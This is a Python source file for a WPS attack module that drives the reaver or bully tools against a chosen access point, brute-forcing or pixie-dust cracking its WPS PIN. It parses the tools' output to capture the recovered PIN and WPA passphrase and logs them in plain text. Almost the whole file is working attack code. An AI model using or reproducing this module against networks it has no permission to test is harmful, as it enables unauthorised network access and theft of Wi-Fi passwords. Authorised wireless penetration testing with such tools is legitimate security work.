"""
WPS attack module — wraps reaver and bully for WPS PIN brute-forcing.
"""

import re
import signal
import subprocess
import threading


class WPSAttack:
    """WPS PIN attack using reaver or bully."""

    def __init__(self, log_fn=None):
        self.log_fn = log_fn
        self.running = False
        self._proc = None
        self._thread = None
        self.result = None
        self.progress = ""
        self.lock = threading.Lock()

    def _log(self, level, message):
        if self.log_fn:
            self.log_fn(level, f"[wps] {message}")

    def start(self, bssid, interface, channel=None, tool="reaver", pixie_dust=False) -> tuple:
        """
        Start WPS attack.
        pixie_dust=True uses offline pixie-dust attack (fast, seconds vs hours).
        Returns (success, message).
        """
        if self.running:
            return False, "WPS attack already running"

        self.running = True
        self.result = None
        self.progress = ""
        mode = "pixie-dust" if pixie_dust else "brute-force"

        self._thread = threading.Thread(
            target=self._run_attack, args=(bssid, interface, channel, tool, pixie_dust), daemon=True
        )
        self._thread.start()

        self._log("info", f"WPS {mode} attack started on {bssid} using {tool}")
        return True, f"WPS {mode} attack started on {bssid}"

    def _run_attack(self, bssid, interface, channel, tool, pixie_dust=False):
        """Run reaver or bully."""
        try:
            if tool == "bully":
                cmd = ["bully", interface, "-b", bssid, "-v", "3"]
                if pixie_dust:
                    cmd += ["-d"]  # bully pixie-dust flag
                if channel:
                    cmd += ["-c", str(channel)]
            else:
                cmd = ["reaver", "-i", interface, "-b", bssid, "-vv"]
                if pixie_dust:
                    cmd += ["-K"]  # reaver pixie-dust flag (uses pixiewps)
                if channel:
                    cmd += ["-c", str(channel)]

            self._proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )

            for line in self._proc.stdout:
                line = line.strip()
                if not line or not self.running:
                    continue

                # Check for PIN found
                pin_match = re.search(r"WPS PIN:\s*'?(\d+)'?", line, re.I)
                if pin_match:
                    with self.lock:
                        if self.result is None:
                            self.result = {"pin": pin_match.group(1)}
                    self._log("info", f"WPS PIN found: {pin_match.group(1)}")

                # Check for password
                psk_match = re.search(r"WPA PSK:\s*'(.+?)'", line, re.I)
                if psk_match:
                    with self.lock:
                        if self.result:
                            self.result["password"] = psk_match.group(1)
                        else:
                            self.result = {"password": psk_match.group(1)}
                    self._log("info", f"WPA password found: {psk_match.group(1)}")

                # Progress
                progress_match = re.search(r"(\d+\.?\d*%\s+complete)", line, re.I)
                if progress_match:
                    with self.lock:
                        self.progress = progress_match.group(1)

                # Trying PIN
                trying_match = re.search(r"Trying pin\s+(\d+)", line, re.I)
                if trying_match:
                    with self.lock:
                        self.progress = f"Trying PIN: {trying_match.group(1)}"

            self._proc.wait()
            with self.lock:
                self.running = False
                if self.result is None:
                    self.result = {"error": "Attack completed without finding PIN"}

        except FileNotFoundError:
            self._log("error", f"{tool} not found. Install with: sudo apt install {tool}")
            with self.lock:
                self.running = False
                self.result = {"error": f"{tool} not installed"}
        except Exception as e:
            self._log("error", f"WPS attack error: {e}")
            with self.lock:
                self.running = False
                self.result = {"error": str(e)}
        finally:
            self._proc = None

    def stop(self):
        """Stop WPS attack."""
        self.running = False
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGTERM)
                self._proc.wait(timeout=5)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None
        self._log("info", "WPS attack stopped")

    def get_status(self) -> dict:
        """Return attack status."""
        with self.lock:
            return {
                "running": self.running,
                "progress": self.progress,
                "result": self.result,
            }
